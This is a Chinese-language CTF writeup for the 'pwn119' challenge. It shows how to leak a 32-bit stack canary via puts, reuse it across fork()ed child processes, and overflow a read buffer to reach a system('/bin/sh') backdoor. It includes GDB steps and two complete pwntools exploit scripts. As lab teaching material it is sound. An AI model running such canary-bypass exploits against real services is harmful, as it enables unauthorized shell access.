# 知识点

Stack

# 题目分析

分类：PWN / Stack。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [exp.py](exp.py)
- [pwn119](pwn119)

## 已有分析

- [pwn119_wp.md](notes/pwn119_wp.md)


### pwn119 Writeup — Fork 复用 Canary 绕过

> **旧样本画像（当前附件未在工作区）：** 32-bit ELF、无 PIE、Canary 开启。若目标服务确为“长期存活的父进程反复 fork 子进程”，子进程会继承父进程当前的栈保护值；第一轮泄露后才可能在后续同一父进程派生的子进程中复用。重启服务、exec、父进程崩溃或额外重置都会使此前泄露失效。请先用当前附件的 `file`、`checksec` 和反汇编复核题目画像。
>
> **相关笔记：** `Canary详解` · `PWN输入输出与协议同步` · `babypie_wp`（read+printf 泄露 canary）· `pwn118_wp`（GOT 劫持绕 canary）· `WP索引与复盘入口`

#### 一、题目概况

| 项目 | 说明 |
|------|------|
| 文件 | 旧样本 `pwn119`（预期 32-bit、Canary、无 PIE）；当前工作区未找到 ELF，附件属性须重新核对 |
| 保护 | Canary 开启，无 PIE |
| 漏洞 | `read` 栈溢出 + `puts` 泄露 + `fork` 复用 canary |
| 后门 | `backdoor`（`0x08048636`）：`system("/bin/sh")` |
| 目标 | 弹 shell |

#### 二、逆向分析

##### 2.1 main — Fork 服务器

```c
int main() {
    logo();                     // 打印 CTF banner
    puts("Try PWN Me!");

    while (1) {
        if (fork() == 0) {      // ★ 子进程
            ctfshow();
            exit(0);            // 子进程在此结束
        } else {
            wait(NULL);         // ★ 父进程等子进程结束
        }                       // 然后循环 → fork 下一个
    }
}
```

##### 2.2 ctfshow — 漏洞函数

```c
void ctfshow() {
    char buf[100];              // ebp-0x70
    memset(buf, 0, 0x64);      // 清 100 字节
    read(0, buf, 0x200);        // ★ 读 512 字节 → 溢出 400+ 字节
    puts(buf);                  // ★ 打印到 null → 可能泄露
    // canary 检查
}
```

##### 2.3 backdoor

```c
void backdoor() {               // 0x08048636
    system("/bin/sh");
}
```

##### 2.4 栈帧布局（偏移量怎么算出来的）

**从 IDA 汇编里抄两个数：**

```
buf 的标签:    [ebp-70h]  →  buf 离 ebp 有 0x70 = 112 字节
canary 的标签: [ebp-Ch]   →  canary 离 ebp 有 0x0C = 12 字节
```

**减法：buf 到 canary 的距离 = 112 - 12 = 100 字节。** 就是 `0x70 - 0x0C = 0x64 = 100`。

**栈上每个格子 4 字节（32 位），从低地址到高地址排列：**

```
离 buf 距离   地址写法      放的什么        payload 里填的
─────────────────────────────────────────────────────
0~99       ebp-0x70~ebp-0x0d  buf[100]      100 个 A
100~103    ebp-0x0c           canary        正确的 canary（通过检查！）
104~107    ebp-0x08           样本栈槽/局部区  0x42424242（需核对 epilogue）
108~111    ebp-0x04           saved ebx    0x43434343（随意）
112~115    ebp+0x00           saved ebp    0x44444444（随意）
116~119    ebp+0x04           ★ 返回地址    p32(0x08048636) → backdoor
```

`ebp-0x08` 的具体用途、`ebx` 是否被保存以及 epilogue 如何恢复，必须以当前 ELF 的函数序言/尾声为准；不能仅凭 4 字节间距称为“对齐区”。上面的地址和偏移是旧样本记录，不是通用模板。

buf 到 canary = `0x70 - 0x0c` = **100 字节**。

#### 三、基础知识：fork() 的内存继承

> **深入阅读：** `栈金丝雀`（Canary 原理）· `保护机制详解` · `babypie_wp`（read+printf 泄露 canary）· `pwn118_wp`（GOT 劫持绕 canary）

> [!note] **🎯 为什么要靠 fork？普通程序不行吗？**
> 普通程序重启通常会获得新的随机初始化；fork 变体的关键是**父进程持续存活且不 exec**，后续子进程继承同一初始状态。这是“子进程可牺牲”的前提，不适用于每个网络服务。

##### 3.1 fork 做了什么？

```
父进程调用 fork() 时，内核：

1. 创建子进程（新的 PID）
2. 复制父进程的整个页表（虚拟内存映射）
3. 标记所有页面为 Copy-on-Write (COW)
4. 两个进程从 fork() 返回：
   ├── 父进程：fork() 返回子进程 PID (>0)
   └── 子进程：fork() 返回 0
```

> [!note] Copy-on-Write (COW)
> 内核不会真的复制所有内存（太慢太费内存）。它让父子进程**共享同一份物理内存**，只有某个进程要"写"某页时才复制那一页。但Canary 在 TLS（Thread Local Storage）里，子进程有自己的 TLS 副本。

##### 3.2 为什么同一父进程派生的 canary 通常相同？（需满足生命周期前提）

在常见 Linux/glibc 实现中，运行时从内核提供的随机源初始化栈保护值并放入 TLS；fork 会复制父进程现有内存状态。因此本题中同一父进程派生的子进程通常看到相同值。具体来源、终止字节和是否重置应以目标系统/GDB 为准。

```
进程启动 → 内核提供 AT_RANDOM 字节 → glibc 动态加载器初始化 guard 并放入 TLS
    │
    ├── 第 1 次 fork → 子进程 1 (canary = K)
    │   ├── ctfshow 溢出 → canary 检查失败 → 子进程 1 死
    │   └── 父进程 wait() → 继续循环
    │
    ├── 第 2 次 fork → 子进程 2 (继承当时的 guard = K；前提是父进程未重置/exec)
    │   └── 用泄露的 K 构造 payload → canary 检查通过 → backdoor
```

> [!warning] 这和普通程序的关键区别
> ```
> 普通程序（无 fork）:
>   溢出 → canary 错误 → 进程崩溃 → 再次运行 → canary 变了 → 无用
>
> fork 程序:
>   子进程溢出 → canary 错误 → 子进程死 → 父进程还在
>   → 父进程仍存活且未重置/exec，再 fork → 子进程通常继承同一 guard → 上一轮泄露才可能仍有效
> ```

#### 四、漏洞 ①：Canary 泄露（puts + 覆盖 null）

##### 4.1 在 GDB 里观察泄露（旧样本地址）

先在 fork 前选择跟踪策略，并在 `ctfshow` 入口停住；随后从当前反汇编定位 `read` 返回后的指令地址：

```
pwndbg> set follow-fork-mode child          # fork 后跟踪子进程
pwndbg> set detach-on-fork off              # 保留父进程，便于稍后切回
pwndbg> catch fork
pwndbg> b ctfshow
pwndbg> run < /tmp/101A                      # 仅观察首个子进程；需按停点继续执行
pwndbg> disassemble ctfshow                  # 找 read 后的实际地址，再设置断点
pwndbg> # 用反汇编所得的真实地址设置断点，再 continue 到 read 返回后
pwndbg> info registers eax ebp esp eip
pwndbg> x/30wx $ebp-0x70
```

**旧记录中的示例输出（不是本轮运行结果）：**

```
0xffffcd58: 0x41414141  0x41414141  ...    ← buf[0:99]，全是 A
0xffffcdb8: 0x41414141  0x1728c041          ← 最后 4 字节 A + canary！
```

**解释 `0x1728c041` 这个值：**

```
原本 canary = 0x1728c000
              00 ← 最低字节，正常的 null 终止符

我们发了 101 个 A：
  buf[0:99]  = 100 个 A（A 的 ASCII 码是 0x41）
  buf[100]   = 第 101 个 A → 覆盖了 canary[0] 的 0x00

变成: 0x1728c041
            41 ← 被 'A' 盖掉的 null 字节
```

**puts 的行为：** 从 buf 开始打印，遇到 `\x00` 才停。原本停在 canary 的 `\x00` 处。现在 `\x00` 变成了 `\x41`（'A'），puts 不停，继续往后读——把 canary 后 3 个随机字节也打出来。

**从输出中抠出 canary：**

```
puts 输出: ...AAAA...AAAA [rand1] [rand2] [rand3] ...
          └── 101 个 A ──┘ └── 泄露的 3 字节 ──┘

canary = \x00 + 这 3 字节 = 完整 4 字节 canary
```

##### 4.2 代码对照

```
正常情况下（100 字节输入）:
  buf[0:99] = 'A'*100
  buf[100] = canary[0] = \x00    ← puts 在此停止
  输出: "AAA...AAA\n" (100 个 A + 换行)

攻击时（101 字节输入）:
  buf[0:99] = 'A'*100
  buf[100] = 'A'                 ← 覆盖 canary 的 null 字节！
  buf[101:104] = canary[1:4]     ← 3 字节随机值；其中若有 NUL，泄露会提前截断
  buf[104...] = 样本中的后续栈字节，内容由实际栈帧决定
  ...
  puts 继续打印，直到碰到下一个 \x00
  输出: "AAA...AAA A [3 canary bytes] [maybe more] \n"
```

##### 4.3 32 位 Canary 的字节序与可泄露长度

```
32 位 canary = [\x00] [rand_1] [rand_2] [rand_3]
                ↑ LSB
```

常见 i386 glibc 的 terminator canary 低字节为 `0x00`，因而本题可以尝试覆盖该字节并通过 `puts` 外泄后续字节；这是实现与目标编译环境相关的观察，先在 GDB 读取 `[ebp-0xc]` 验证，不应泛化为所有 32 位程序。

##### 4.4 泄露边界与读入检查

单次 `read()` 可能短读；网络传输中的一次 `send()` 也不保证目标 `read()` 恰好收到全部 101 字节。只有确认 `read` 返回至少 101，并在输出中收到完整 marker 及 3 个 Canary 高字节，才可重建 4 字节值。若高字节中出现 `\x00`，`puts` 会提前停止，这一轮泄露不完整；不能假设后续 saved register 的首字节一定为 NUL。由于 Canary 字节本身也可能是换行，若首个换行出现在 marker 后不足 4 字节的位置，本轮必须丢弃，避免把 `puts()` 自带的换行误当作 Canary 字节。

```
实际泄露布局由目标栈帧决定；`puts` 在遇到首个 NUL 时停止。
```

```python
marker = b"A" * 101
head = p.recvuntil(marker, timeout=3)
tail = p.recvuntil(b"\n", timeout=3)  # puts() 添加换行；可能遇到 Canary 内的换行而提前结束
if not head.endswith(marker) or len(tail) < 4:
    raise ValueError("本轮 Canary 泄露不完整或边界有歧义；丢弃本轮，不猜缺失字节")
leak = tail[:3]
canary = b"\x00" + leak
```

marker 后至少需要 4 个字节，才能把 3 个 Canary 高字节与 `puts()` 的行结束字节区分开；若 Canary 自身的换行让输出提前结束，本例选择失败关闭，不把该轮误当作完整泄露。

#### 五、漏洞 ②：栈溢出到 backdoor

##### 5.1 Payload 布局

第二阶段（canary 已知后），发送 120 字节：

```
偏移    内容              说明
─────────────────────────────────────────
[0:100]   'A' * 100        填满 buf
[100:104] canary            正确的 canary（含 \x00 LSB）
[104:108] 0x42424242        样本栈槽占位（确认不会被后续使用后再填）
[108:112] 0x43434343        saved_ebx（任意值，不会用到）
[112:116] 0x44444444        saved_ebp（任意值）
[116:120] p32(0x08048636)   ★ 返回地址 → backdoor
```

##### 5.2 为什么 saved_ebx/saved_ebp 填任意值没问题？

```
canary 检查通过后:
    mov -0x4(%ebp), %ebx    ← 恢复 ebx = 0x43434343 (我们用不到)
    leave                    ← mov esp, ebp; pop ebp → ebp = 0x44444444
    ret                      ← pop eip = 0x08048636 → 跳 backdoor

backdoor 执行:
    push ebp                ← 存 0x44444444 (无所谓)
    mov ebp, esp            ← Intel 语法：建立 backdoor 自己的栈帧
    call system@plt         ← system("/bin/sh")
```

是否可随意破坏 saved `ebx` / `ebp` 取决于该函数的 epilogue、PIC/PLT 调用和后门代码；应在返回前单步确认。i386 没有 AMD64 SysV 的同一栈对齐规则，但库函数仍可能有自己的对齐或寄存器前提，不能把“任意填充必定无影响”当公式。

##### 5.3 puts 对第二阶段的副作用

第二阶段的 buf 开头是 100 个 'A'，后面紧跟 canary（首字节 `\x00`）。`puts(buf)` 打印 100 个 'A' 然后在 canary 的 `\x00` 处停止——不影响后续。puts 输出后，canary 检查通过，`leave; ret` 到 backdoor。

#### 六、EXP 样例（目标附件适配前不可直接照抄）

以下按旧样本布局写成复现骨架，并未在当前环境运行。使用前需核对二进制地址、Canary 偏移、后续栈槽、读入长度、服务是否由同一父进程持续 fork，以及远端 I/O 是否保持同一字节流。脚本等待启动 banner，前提是目标确实刷新该输出；若目标没有刷新，先检查其 I/O 配置，不要把超时当作子进程就绪信号。若 Canary 的三个高字节中包含 NUL，`puts` 会提前截断，本样例会主动失败而不是猜值。远程分支中的 HOST/PORT 需换成题目给出的地址和端口。

```python
from pwn import *
import os

context.arch = "i386"
context.log_level = "info"

BACKDOOR = 0x08048636     # 旧样本地址；先用 checksec、ELF 符号和反汇编复核
pwn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwn119")
p = process(pwn) if not args.REMOTE else remote("HOST", 31337)

### banner 位于循环外，只在这个父进程启动时打印一次。
banner = p.recvuntil(b"Try PWN Me!\n", timeout=3)
if not banner.endswith(b"Try PWN Me!\n"):
    p.close()
    raise RuntimeError("启动 banner 未收到；检查 stdout 刷新和服务 I/O 模型")

### ═══ 第一阶段：泄露 Canary ═══
p.send(b"A" * 101)                          # 100 字节填 buf + 1 字节覆盖 canary 的 \x00
                                             # 泄露原理：
                                             #   canary = [\x00][rand1][rand2][rand3]
                                             #   覆盖 \x00 → puts 会打印 rand1~3

marker = b"A" * 101
head = p.recvuntil(marker, timeout=3)         # puts(buf) 输出 marker；不是输入回显
if not head.endswith(marker):
    p.close()
    raise ValueError("未收到完整 marker；检查 read 短读、I/O 同步和目标输出")
tail = p.recvuntil(b"\n", timeout=3)          # puts() 的换行；高字节若含换行会提前命中
if len(tail) < 4:
    p.close()
    raise ValueError("Canary 泄露不完整或边界有歧义：检查短读、NUL/换行截断")
leak = tail[:3]
canary = b"\x00" + leak                    # 仅适用于已验证的 i386 terminator-canary 布局
log.success(f"canary: {canary.hex()}")

### 第一阶段失败后，父进程通常 wait 并继续 fork。题目伪代码中的 banner 不会重印。
### 这里没有通用的“下一轮提示符”；同一连接中的后续输入是否进入下一子进程，须核对服务模型。

### ═══ 第二阶段：溢出 → 跳到 backdoor ═══
payload  = b"A" * 100 + canary              # 填 buf + 正确的 canary（通过检查！）
payload += p32(0x42424242)                  # 旧样本 ebp-8 栈槽；先确认 epilogue 不依赖
payload += p32(0x43434343)                  # 仅在确认此处是 saved_ebx 后使用
payload += p32(0x44444444)                  # saved_ebp；确认后门路径不依赖其原值
payload += p32(BACKDOOR)                    # ★ 返回地址 → system("/bin/sh")
assert len(payload) == 120
p.send(payload)
p.interactive()                              # 仅在目标附件、服务模型与 payload 前提匹配时才可能进入 shell
```

#### 七、利用流程（时间线）

```
父进程 fork ──→ 子进程 1 (canary = K)               父进程
    │              │                                   │
    │              ├─ 接收 "A"*101                     │
    │              ├─ puts() 泄露 K[1:4]               │
    │              ├─ canary 检查失败 (K 被破坏)         │
    │              └─ __stack_chk_fail → 通常 abort/SIGABRT │
    │                                                  │
    │←──────────────────── wait() 返回 ─────────────────│
    │                                                  │
    ├─ fork ──→ 子进程 2 (canary = K, 不变！)            │
    │              │                                   │
    │              ├─ 接收: A*100 + K + junk + backdoor │
    │              ├─ puts("AAA...") (在 K[0]=null 截断) │
    │              ├─ canary 检查通过 ✓                  │
    │              ├─ leave; ret → backdoor             │
    │              └─ system("/bin/sh") 🎉              │
```

#### 八、I/O 同步与服务模型边界

`recv(timeout=...)` 只是“在超时内尝试收数据”，不是“等待下一轮子进程就绪”的同步协议。按本页伪代码，`logo()` 与 `Try PWN Me!` 在 `while` 之前，只打印一次；子进程失败后父进程不会重印 banner。

如果题目服务确实由同一父进程持续 fork，且子进程共用同一连接/管道，第二阶段数据可以在父进程等待期间进入内核缓冲区，供下一子进程读取；但这取决于实际服务封装和读入行为。不要用固定 sleep 或空 `recv(timeout)` 当作证据。应在本地检查父进程是否继续 fork、下一子进程是否读取到第二阶段 marker；远程题则先确认服务模型。

#### 九、知识点总结

```
┌──────────────────────┬──────────────────────────────────────────┐
│ 知识点                │ 原理                                     │
├──────────────────────┼──────────────────────────────────────────┤
│ fork() 内存继承       │ 子进程继承 fork 时 guard；复用有生命周期前提 │
│ Copy-on-Write (COW)  │ 共享内存直到写入才复制                     │
│ Canary 结构 (32-bit) │ 4 字节，首字节 \x00，3 字节随机            │
│ puts() 泄露           │ 覆盖 null 字节 → puts 越过打印后续数据    │
│ "崩溃无所谓"范式       │ 子进程死 → 父进程继续 → 信息保留          │
│ 栈对齐               │ 按目标 ABI、返回路径和实际指令验证，不按位数猜 │
│ 代码地址 (无 PIE)     │ 地址固定但仍以当前附件符号/反汇编复核        │
└──────────────────────┴──────────────────────────────────────────┘
```

> [!tip] fork 类题目的通用思路
> 1. 确认 fork 循环（`while(1) { fork()... }`）
> 2. 第一轮：泄露 canary（覆盖 null → puts/printf 泄露）
> 3. 第一轮 Canary 失败通常走 `__stack_chk_fail`/`abort`；确认父进程仍存活且会继续 fork
> 4. 第二轮：用泄露的 canary + 溢出 → 跳 backdoor/ROP/shellcode
>
#### 附录：GDB 调试 pwn119 全过程

**相关笔记：** `PWN动态调试通用思路`（fork 调试章节）

##### GDB 调试 fork 题目的核心问题

pwn119 用 `fork()` 创建子进程处理用户输入。GDB 默认 `follow-fork-mode` 为 parent，默认 `detach-on-fork` 为 on；只设置跟随 child 会让另一个进程被 detach。若要在同一次调试里保留父子进程，需显式关闭 detach，并用 `info inferiors` / `inferior N` 切换。

```gdb
set follow-fork-mode child
set detach-on-fork off
catch fork
b ctfshow
run
info inferiors
```

命中 fork catchpoint 后执行 `continue` 到子进程的 `ctfshow` 断点。子进程失败后切回父进程 inferior，观察 `wait()` 返回和下一轮 fork；GDB 默认不会自动让所有 inferior 同时运行。

##### 关键断点地址

旧笔记记录过以下地址，但当前工作区没有对应 ELF，不能保证它们与手中附件匹配。优先用符号断点和当前反汇编重新定位：

```
0x080486bb  ctfshow 入口（push ebp）
0x080486d6  canary 已存入栈——此时看 canary 初值
0x080486fe  read() 返回后——此时看 buf 被覆盖成什么样
0x08048701  puts() 调用前——验证泄露前的栈
0x08048711  canary 检查——看子进程是否崩溃
```

##### 第一步：看 canary 的初值

**为什么要看：** 先从当前函数序言确认 guard 被存到哪里；函数入口处的栈槽尚未必写入 canary，所以要单步到保存指令执行之后再读。

在 `ctfshow` 入口停住后，先查看当前反汇编：

```gdb
disassemble ctfshow
```

找到类似下面的 guard 保存指令：

```asm
mov [ebp+var_C], eax            ; var_C = ebp - 0x0C
```

在函数入口处用 `ni` 逐条执行序言，直到确认“把 guard 存入栈槽”的指令已经执行完；不要只执行固定一次。随后检查目标栈槽：

```gdb
### 反复执行 ni，直到越过保存 guard 的指令
ni
x/wx $ebp-0xc
```

`[ebp-0xc]` 是旧样本的偏移示例；必须用当前反汇编确认。低字节是否为 NUL 也要现场验证。

##### 第二步：发 101 个 A，看栈被覆盖后的样子

**为什么要做：** 这是旧样本的假设：buf 到 Canary 的距离为 100，且输入完整到达；第 101 字节才会覆盖 guard 的低字节。先核对当前 ELF 的偏移与 `read` 返回值。

先从当前反汇编确定 `call read` 的下一条指令地址，并在该处设断点。下面的 `ADDRESS_AFTER_READ` 是占位文字，必须替换为本次 ELF 的真实地址，不能原样输入 GDB，也不要复制旧地址：

```gdb
break *ADDRESS_AFTER_READ
run < /tmp/101A
```

程序重新运行后，先在 fork catchpoint 执行一次 `continue` 到子进程，再从 `ctfshow` 入口执行一次 `continue` 到 `read` 返回后的断点，然后检查：

```gdb
info registers eax ebp esp eip
x/30wx $ebp-0x70
```

只有当 `eax`（`read` 返回值）至少为 101 时，才能说这次 101 字节覆盖完整到达。buf 地址 `[ebp-0x70]` 也是旧样本值，应从当前 IDA/反汇编确认。旧样本中它来自：

```asm
lea eax, [ebp+s]                ; s = ebp - 0x70
```

旧日志中的示例（不是固定输出）：
```
0xffffcd58: 0x41414141 ...       ← 全是 A（0x41 = 'A' 的 ASCII）
0xffffcdb8: 0x41414141 0x1728c041  ← canary 原值 0x1728c000 被改成了 0x1728c041
```
`0x1728c041` 的最后 `41` 就是第 101 个 A 盖掉的 canary null 字节。

##### 第三步：看 puts 怎么泄露

**为什么要看：** 若覆盖成功且 guard 后续字节没有 NUL，`puts` 会继续输出相邻字节。若高字节含 NUL，就会提前截断；不要预设一定能泄露完整 3 字节。

```gdb
### 在当前 ELF 的 puts 调用前断下
x/30wx $ebp-0x70
si                              # 或继续到 puts 返回后观察实际输出
```

##### 第四步：canary 检查失败 → 子进程崩溃

**为什么要看：** 确认 guard 失败路径及父进程是否存活。常见 glibc 路径调用 `abort()`，通常表现为 SIGABRT；仍应以现场 `bt`、`info program` 和父进程状态为准。

```gdb
disassemble ctfshow
info registers
bt
info program
### 切换到父进程 inferior，确认 wait() 返回及后续 fork
```

单独使用 `run < /tmp/101A` 会让首个子进程读完文件后遇到 EOF；它适合观察一次覆盖和泄露，不足以验收父进程能否通过同一连接读取第二阶段 payload。完整服务行为和 EXP 仍需在目标附件/服务模型中实测。

#### 资料

- [GDB：Debugging Forks](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Forks.html)：`follow-fork-mode`、`detach-on-fork` 与 `info inferiors` 的行为。
- [Linux `fork(2)`](https://man7.org/linux/man-pages/man2/fork.2.html)：父子进程初始内存内容相同、后续写入相互隔离的语义。
- [Linux `read(2)`](https://man7.org/linux/man-pages/man2/read.2.html)：`read` 读取“最多”指定字节，短读不等同于错误。
- [GCC Instrumentation Options](https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html)：`-fstack-protector` 系列的插桩条件。
- [Linux `abort(3)`](https://man7.org/linux/man-pages/man3/abort.3.html)：`abort()` 的终止与 `SIGABRT` 行为；目标具体失败路径仍以现场为准。

#### 相关代码与实战模板

- 本页模板入口：`Linux ELF 画像工具` · `pwntools EXP 启动骨架` · `GDB 观察模板`。
- 全局选择：`选择指南`；完整逐篇清单：`逐篇映射表`。
- 相关题目/WP：本页即题解；`全部题解索引`。
- 本页已有代码片段是教学/题解材料；除非验证报告明确记录对应目标和验收结果，不应视为可运行模板或 exploit 成功。


# EXP

- [exp.py](exp.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import *
from pathlib import Path
context.arch = "i386"
context.log_level = "info"
BACKDOOR = 0x08048636
pwn = Path(__file__).resolve().with_name("pwn119")
pwn_root = Path(__file__).resolve().parents[3]
loader = pwn_root / "libc/2.23/i386/ld-linux.so.2"
libdir = pwn_root / "libc/2.23/i386/lib"
p = process([str(loader), "--library-path", str(libdir), str(pwn)])
# consume banner
p.recv(timeout=3)
# stage 1: leak canary
p.send(b"A" * 101)
data = p.recv(300, timeout=3)
idx = data.find(b"A" * 101)
canary = b"\x00" + data[idx + 101: idx + 104]
log.success(f"canary: {canary.hex()}")
# wait for next fork iteration
p.recv(timeout=2)
# stage 2: overflow → backdoor
p.send(b"A" * 100 + canary + p32(0x42424242) + p32(0x43434343) + p32(0x44444444) + p32(BACKDOOR))
p.interactive()
```
